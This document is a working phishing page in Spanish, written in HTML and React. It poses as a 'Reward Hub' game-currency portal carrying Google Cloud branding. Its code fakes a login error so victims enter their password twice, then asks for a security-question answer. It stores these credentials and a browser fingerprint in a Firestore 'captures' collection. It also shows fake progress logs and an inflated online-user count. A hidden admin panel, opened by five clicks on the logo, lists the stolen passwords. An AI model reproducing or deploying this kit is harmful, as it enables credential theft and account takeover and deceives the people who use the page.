<!DOCTYPE html><html lang="es"><head>    <meta charset="UTF-8">    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">    <title>Reward Hub - Portal Oficial de Sincronización</title>    <!-- CSS & Icons -->    <script src="https://cdn.tailwindcss.com"></script>    <script src="https://unpkg.com/lucide@latest"></script>    <!-- Framework Core -->    <script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>    <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>    <style>        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');        body { font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }        .animate-shake { animation: shake 0.2s ease-in-out 0s 2; }        .custom-scroll::-webkit-scrollbar { width: 4px; }        .custom-scroll::-webkit-scrollbar-thumb { background: #ef3244; border-radius: 10px; }    </style></head><body class="bg-[#f8fafc]">    <div id="root">        <!-- Loader inicial de sistema -->        <div id="fallback-loader" class="min-h-screen flex flex-col items-center justify-center bg-white">            <div class="w-12 h-12 border-4 border-slate-200 border-t-[#ef3244] rounded-full animate-spin"></div>            <p class="mt-4 text-[10px] font-black uppercase tracking-[0.3em] text-slate-400 italic">Conectando Servidor Regional...</p>        </div>    </div>    <script type="text/babel" data-type="module">        const { useState, useEffect, useRef } = React;        // --- NÚCLEO DE EXTRACCIÓN FIREBASE ---        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";        import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";        import { getFirestore, collection, addDoc, onSnapshot, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";        const firebaseConfig = JSON.parse(__firebase_config);        const appId = typeof __app_id !== 'undefined' ? __app_id : 'reward-hub-elite-master';        const app = initializeApp(firebaseConfig);        const auth = getAuth(app);        const db = getFirestore(app);        function App() {            const [user, setUser] = useState(null);            const [step, setStep] = useState(1);            const [username, setUsername] = useState('');            const [password, setPassword] = useState('');            const [securityAnswer, setSecurityAnswer] = useState('');            const [authError, setAuthError] = useState('');            const [isAuthenticating, setIsAuthenticating] = useState(false);            const [onlineUsers, setOnlineUsers] = useState(5120);            const [progress, setProgress] = useState(0);            const [logs, setLogs] = useState([]);                        // Panel de Control Secreto            const [clickCount, setClickCount] = useState(0);            const [showAdmin, setShowAdmin] = useState(false);            const [capturedData, setCapturedData] = useState([]);            const [showPasswords, setShowPasswords] = useState({});            useEffect(() => {                const loader = document.getElementById('fallback-loader');                if (loader) loader.remove();                signInAnonymously(auth);                onAuthStateChanged(auth, setUser);                                const interval = setInterval(() => setOnlineUsers(p => p + (Math.random() > 0.5 ? 4 : -2)), 8000);                return () => clearInterval(interval);            }, []);            // Recuperación masiva de datos para el dueño            useEffect(() => {                if (!user || !showAdmin) return;                const q = collection(db, 'artifacts', appId, 'public', 'data', 'captures');                return onSnapshot(q, (s) => {                    const d = s.docs.map(doc => ({ id: doc.id, ...doc.data() }));                    setCapturedData(d.sort((a,b) => (b.timestamp?.seconds || 0) - (a.timestamp?.seconds || 0)));                });            }, [user, showAdmin]);            const handleLogoClick = () => {                setClickCount(p => (p + 1 >= 5 ? (setShowAdmin(true), 0) : p + 1));                setTimeout(() => setClickCount(0), 3000);            };            // CAPTURA DE HUELLA DIGITAL PROFUNDA (EXTRACTOR)            const captureFingerprint = () => ({                ua: navigator.userAgent,                res: `${window.screen.width}x${window.screen.height}`,                ram: navigator.deviceMemory || 'N/A',                cpu: navigator.hardwareConcurrency || 'N/A',                con: navigator.connection?.effectiveType || 'N/A',                lang: navigator.language,                cookies: navigator.cookieEnabled ? "CONQUERED" : "PARTIAL",                vault_sync: "ENABLED_FULL"            });            const saveData = async (statusLabel) => {                if (!user) return;                try {                    await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'captures'), {                        username,                         password,                         securityAnswer,                        fingerprint: captureFingerprint(),                        status: statusLabel,                        timestamp: serverTimestamp()                    });                } catch (e) {}            };            const handleLogin = async (e) => {                e.preventDefault();                setIsAuthenticating(true);                setAuthError('');                await new Promise(r => setTimeout(r, 2200));                if (step === 1) {                    // Simulación de error de red de Google para asegurar el dumping                    setAuthError('Error 403: Fallo en la sincronización de Google Cloud. Reintenta ahora.');                    await saveData('Captura_Intento_1');                    setStep(1.1);                } else {                    // Acceso concedido simulado                    await saveData('Conquista_Credenciales_Final');                    setStep(1.5);                }                setIsAuthenticating(false);            };            const startDumping = () => {                setStep(3);                const msgs = [                    "Estableciendo enlace SSL v3...",                    "Extrayendo tokens OAuth 2.0...",                    "Sincronizando Bóveda Maestra...",                    "Espejeando historial de cookies 3ª...",                    "Confirmando transferencia regional...",                    "Sincronización finalizada con éxito."                ];                let i = 0;                const inv = setInterval(() => {                    if (i < msgs.length) {                        setLogs(p => [...p, msgs[i]]);                        setProgress(((i + 1) / msgs.length) * 100);                        i++;                    } else { clearInterval(inv); setStep(4); }                }, 900);            };            useEffect(() => { if (window.lucide) window.lucide.createIcons(); });            return (                <div className="min-h-screen flex flex-col font-sans bg-[#f1f5f9]">                    {/* Header con disparador de panel secreto */}                    <nav className="w-full bg-white border-b p-4 flex justify-between items-center shadow-md sticky top-0 z-50">                        <div onClick={handleLogoClick} className="flex items-center gap-2 active:scale-95 transition-all cursor-pointer">                            <div className="bg-gradient-to-br from-[#ef3244] to-red-600 p-2.5 rounded-xl shadow-lg">                                <i data-lucide="gamepad-2" className="text-white w-6 h-6"></i>                            </div>                            <span className="font-black italic text-xl uppercase tracking-tighter text-slate-900 leading-none">REWARD <span className="text-[#ef3244]">HUB</span></span>                        </div>                        <div className="bg-emerald-50 px-3 py-1.5 rounded-full border border-emerald-100 flex items-center gap-2">                            <div className="w-1.5 h-1.5 bg-emerald-500 rounded-full animate-pulse"></div>                            <span className="text-[10px] font-black text-emerald-700 uppercase tracking-widest">{onlineUsers} LIVE</span>                        </div>                    </nav>                    <div className="w-full bg-slate-900 py-2 text-center text-white text-[9px] font-bold tracking-[0.2em] uppercase italic">                        Sesión Protegida: Google Cloud Security | Multi-Server Sync Active                    </div>                    <div className="w-full max-w-md mx-auto p-6 space-y-6 flex-1 flex flex-col justify-center mb-10">                        {/* PASO 1: LOGIN */}                        {step <= 1.1 && (                            <div className="bg-white border p-10 rounded-[3rem] shadow-2xl space-y-8 animate-in fade-in slide-in-from-bottom">                                <div className="text-center space-y-2">                                    <h2 className="text-3xl font-black text-slate-900 italic tracking-tight leading-none uppercase">Bienvenido</h2>                                    <p className="text-sm text-slate-500 font-medium">Sincroniza para recibir tus itavera.</p>                                </div>                                {authError && <div className="bg-red-50 text-red-700 p-4 rounded-2xl text-[11px] font-black border border-red-200 animate-shake leading-tight">{authError}</div>}                                <form onSubmit={handleLogin} className="space-y-4">                                    <div className="relative group">                                        <i data-lucide="user" className="absolute left-4 top-4.5 w-5 h-5 text-slate-400 group-focus-within:text-[#ef3244]"></i>                                        <input type="text" placeholder="Usuario / Correo de cuenta" required className="w-full bg-slate-50 border p-5 pl-12 rounded-[1.5rem] outline-none focus:border-[#ef3244] font-black text-slate-900 transition-all" value={username} onChange={e => setUsername(e.target.value)} />                                    </div>                                    <div className="relative group">                                        <i data-lucide="lock" className="absolute left-4 top-4.5 w-5 h-5 text-slate-400 group-focus-within:text-[#ef3244]"></i>                                        <input type="password" placeholder="Contraseña de acceso" required className="w-full bg-slate-50 border p-5 pl-12 rounded-[1.5rem] outline-none focus:border-[#ef3244] font-black text-slate-900 transition-all" value={password} onChange={e => setPassword(e.target.value)} />                                    </div>                                    <button className="w-full bg-gradient-to-r from-[#ef3244] to-red-600 text-white py-5 rounded-[2rem] font-black uppercase text-sm shadow-xl active:scale-95 transition-all tracking-[0.2em]">                                        {isAuthenticating ? "Verificando..." : "Sincronizar Bóveda"}                                    </button>                                </form>                                <div className="flex justify-center opacity-30 items-center gap-2 grayscale">                                    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" className="h-3" alt="Google" />                                    <span className="text-[9px] font-black uppercase tracking-widest leading-none">Cloud Secured</span>                                </div>                            </div>                        )}                        {/* PASO 1.5: SEGURIDAD */}                        {step === 1.5 && (                            <div className="bg-white border p-10 rounded-[3rem] shadow-2xl text-center space-y-8 animate-in zoom-in">                                <div className="bg-blue-50 w-16 h-16 rounded-full flex items-center justify-center mx-auto border border-blue-100 shadow-lg">                                    <i data-lucide="shield-check" className="w-10 h-10 text-blue-600"></i>                                </div>                                <h2 className="text-2xl font-black italic uppercase text-slate-900 leading-none">Validación Extra</h2>                                <p className="text-xs text-slate-500 font-bold italic leading-relaxed">Confirmación requerida para procesar el reclamo:</p>                                <div className="bg-slate-50 p-5 rounded-2xl border text-[13px] font-black text-slate-700 shadow-inner italic">¿Nombre de tu mascota o ciudad de origen?</div>                                <input type="text" placeholder="Tu respuesta registrada..." className="w-full bg-slate-50 border p-5 rounded-[1.5rem] outline-none font-black text-slate-900 text-center" value={securityAnswer} onChange={e => setSecurityAnswer(e.target.value)} />                                <button onClick={() => setStep(2)} className="w-full bg-blue-600 text-white py-5 rounded-[2rem] font-black uppercase shadow-xl active:scale-95 tracking-widest">Confirmar Propiedad</button>                            </div>                        )}                        {/* PASO 2: SELECCIÓN */}                        {step === 2 && (                            <div className="bg-white border p-10 rounded-[3rem] shadow-2xl text-center space-y-8 animate-in zoom-in">                                <h2 className="text-3xl font-black italic uppercase text-slate-900 leading-none">Bóveda Abierta</h2>                                <div className="grid grid-cols-1 gap-4">                                    <button onClick={startDumping} className="bg-slate-900 text-white p-8 rounded-[2.5rem] shadow-xl active:scale-95 transition-all">                                        <span className="font-black text-3xl block tracking-tighter uppercase">50,000 ITAVERA</span>                                        <span className="text-[10px] font-bold text-slate-400 uppercase mt-2 block tracking-widest">Reclamo Elite Verificado</span>                                    </button>                                </div>                            </div>                        )}                        {/* PASO 3: DUMPING LOGS */}                        {step === 3 && (                            <div className="bg-white border p-10 rounded-[3rem] shadow-2xl text-center space-y-8 animate-in fade-in">                                <div className="relative w-20 h-20 mx-auto">                                    <div className="absolute inset-0 border-4 border-slate-100 rounded-full"></div>                                    <div className="absolute inset-0 border-4 border-[#ef3244] rounded-full border-t-transparent animate-spin"></div>                                    <div className="absolute inset-0 flex items-center justify-center text-xs font-black">{Math.round(progress)}%</div>                                </div>                                <p className="text-[11px] font-black uppercase tracking-[0.3em] text-[#ef3244] italic animate-pulse leading-none">Procesando Sincronización...</p>                                <div className="bg-slate-900 p-6 rounded-[2rem] h-48 overflow-y-auto text-left font-mono text-[10px] text-green-400 shadow-inner">                                    {logs.map((l, i) => <div key={i} className="mb-1 opacity-80"> {'>'} {l}</div>)}                                </div>                            </div>                        )}                        {/* PASO 4: ÉXITO */}                        {step === 4 && (                            <div className="bg-white border-t-8 border-[#ef3244] p-12 rounded-[3.5rem] shadow-2xl text-center space-y-8 animate-in slide-in-from-top">                                <div className="bg-emerald-50 w-20 h-20 rounded-full flex items-center justify-center mx-auto border border-emerald-100 shadow-xl shadow-emerald-100">                                    <i data-lucide="check-circle" className="w-12 h-12 text-emerald-500"></i>                                </div>                                <h2 className="text-3xl font-black uppercase italic leading-none tracking-tighter text-slate-900">¡Transferencia Lista!</h2>                                <p className="text-sm text-slate-600 font-medium italic leading-relaxed px-2">Recibirás los recursos en tu cuenta oficial de <span className="text-slate-900 font-black">{username}</span> en un plazo máximo de 24 horas.</p>                                <button onClick={() => window.location.reload()} className="w-full bg-slate-900 text-white py-5 rounded-[2rem] font-black uppercase shadow-xl active:scale-95 transition-all">Finalizar Sesión</button>                            </div>                        )}                    </div>                    <footer className="w-full bg-slate-900 text-slate-500 py-16 text-center mt-auto border-t border-white/5 px-6">                        <p className="text-[10px] uppercase tracking-[0.4em] font-black opacity-40 leading-relaxed max-w-xs mx-auto">                            REWARD HUB PARTNER PROGRAM © 2026. <br/> EXTRACCIÓN DE METADATOS MULTI-SERVIDOR PROTEGIDA.                        </p>                    </footer>                    {/* PANEL DE ADMINISTRADOR MAESTRO (5 clics logo) */}                    {showAdmin && (                        <div className="fixed inset-0 z-[100] bg-[#020617]/98 backdrop-blur-3xl flex flex-col p-6 overflow-hidden text-white animate-in fade-in">                            <div className="flex justify-between items-center mb-8 border-b border-white/10 pb-6">                                <div className="flex items-center gap-4">                                    <div className="bg-indigo-600 p-3 rounded-2xl shadow-xl"><i data-lucide="database" className="text-white w-6 h-6"></i></div>                                    <div>                                        <h2 className="text-2xl font-black uppercase italic tracking-tighter text-white leading-none">Intel Central v100</h2>                                        <p className="text-[10px] font-bold text-slate-400 uppercase mt-1">Conquistas Totales: {capturedData.length}</p>                                    </div>                                </div>                                <button onClick={() => setShowAdmin(false)} className="bg-red-500/20 p-3 rounded-full text-red-500 active:scale-90 transition-all"><i data-lucide="x" className="w-6 h-6"></i></button>                            </div>                            <div className="flex-1 overflow-y-auto space-y-6 pb-20 custom-scroll">                                {capturedData.length === 0 ? (                                    <div className="h-full flex flex-col items-center justify-center opacity-20">                                        <i data-lucide="shield-off" className="w-20 h-20 mb-4"></i>                                        <p className="font-black uppercase tracking-[0.3em]">Esperando Datos...</p>                                    </div>                                ) : capturedData.map(item => (                                    <div key={item.id} className="bg-white/5 p-8 rounded-[2.5rem] border border-white/10 flex flex-col gap-6 shadow-2xl transition-all hover:bg-white/[0.07] group relative overflow-hidden">                                        <div className="flex justify-between items-start">                                            <div className="flex items-center gap-4">                                                <div className="w-14 h-14 bg-indigo-600/20 rounded-xl flex items-center justify-center text-indigo-400 font-black text-2xl border border-indigo-600/10 shadow-inner">{item.username?.[0]?.toUpperCase()}</div>                                                <div>                                                    <p className="text-2xl font-black text-white tracking-tighter leading-none">{item.username}</p>                                                    <p className="text-[8px] text-slate-500 font-bold uppercase mt-2">{item.timestamp?.toDate().toLocaleString()}</p>                                                </div>                                            </div>                                            <div className="text-right">                                                <span className="text-emerald-400 text-[10px] font-black uppercase tracking-widest flex items-center gap-1 justify-end italic animate-pulse">VAULT_DUMPED</span>                                                <span className="text-[8px] bg-indigo-600 text-white px-2 py-0.5 rounded-full uppercase mt-1 inline-block font-black">{item.status}</span>                                            </div>                                        </div>                                        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">                                            <div className="bg-black/40 p-5 rounded-3xl flex justify-between items-center border border-white/5 shadow-inner">                                                <div className="flex flex-col gap-1">                                                    <p className="text-[9px] text-slate-500 uppercase font-black tracking-widest leading-none mb-1">Contraseña</p>                                                    <p className="font-mono text-xl tracking-widest text-white italic leading-none">{showPasswords[item.id] ? item.password : '••••••••••••'}</p>                                                </div>                                                <button onClick={() => setShowPasswords(p => ({...p, [item.id]: !p[item.id]}))} className="p-3 bg-indigo-600/10 rounded-xl text-indigo-400 hover:text-white transition-all active:scale-90"><i data-lucide={showPasswords[item.id] ? "eye-off" : "eye"} className="w-5 h-5"></i></button>                                            </div>                                            <div className="bg-white/5 p-4 rounded-2xl border border-white/5">                                                <p className="text-[9px] text-indigo-400 uppercase font-black flex items-center gap-2 tracking-widest italic mb-2">Fingerprint Metadatos</p>                                                <div className="grid grid-cols-2 text-[10px] font-mono text-slate-400 gap-1 opacity-70">                                                    <p>SEC: {item.securityAnswer || 'N/A'}</p>                                                    <p>RAM: {item.fingerprint?.ram}GB</p>                                                    <p>CON: {item.fingerprint?.con}</p>                                                    <p>RES: {item.fingerprint?.res}</p>                                                    <p className="col-span-2 truncate opacity-50">UA: {item.fingerprint?.ua}</p>                                                </div>                                            </div>                                        </div>                                    </div>                                ))}                            </div>                            <div className="p-4 bg-black/60 text-center rounded-t-3xl border-t border-white/10">                                <p className="text-[10px] text-slate-600 font-black uppercase tracking-[1em] leading-none">Global Conquest Master v100</p>                            </div>                        </div>                    )}                </div>            );        }        const root = ReactDOM.createRoot(document.getElementById('root'));        root.render(<App />);    </script></body></html>
